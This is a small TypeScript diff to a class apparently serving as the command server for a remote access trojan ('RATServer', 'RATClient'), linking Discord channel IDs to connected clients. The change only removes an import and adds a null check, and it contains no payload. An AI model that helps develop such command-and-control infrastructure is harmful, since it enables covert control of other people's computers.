@@ -2,7 +2,6 @@ import {createServer, Server, Socket} from 'net';
 import CustomClient from './CustomClient';
 import ITCPServer from "../interfaces/IRATServer";
 import RATClient from './RATClient';
-import TextChannel from 'discord.js';
 import Code from '../enums/Codes';
 
 export default class RATServer implements ITCPServer {
@@ -70,11 +69,14 @@ export default class RATServer implements ITCPServer {
     }
 
     async getClientByChannelId(channelId: string): Promise<RATClient | undefined> {
-        const user = await this.client.database.user.findFirstOrThrow({
+        const user = await this.client.database.user.findFirst({
             where: {
                 channelId: channelId
             }
         });
+        if (!user) {
+            return undefined;
+        }
         const RATClient = this.client.ratServer.ratClients.find(client => client.uuid == user.uuid);
         if (!RATClient) {
             return undefined;
